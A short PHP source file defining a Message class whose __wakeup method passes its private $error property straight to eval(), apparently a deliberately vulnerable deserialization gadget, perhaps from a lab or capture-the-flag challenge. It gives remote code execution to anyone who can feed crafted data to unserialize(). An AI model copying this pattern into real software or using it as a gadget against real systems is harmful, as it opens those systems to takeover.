<?php

namespace App\Classes;


class Message
{
   
   private $error;


   function __wakeup()
   {

      if (isset($this->error)) eval($this->error);
   }
}


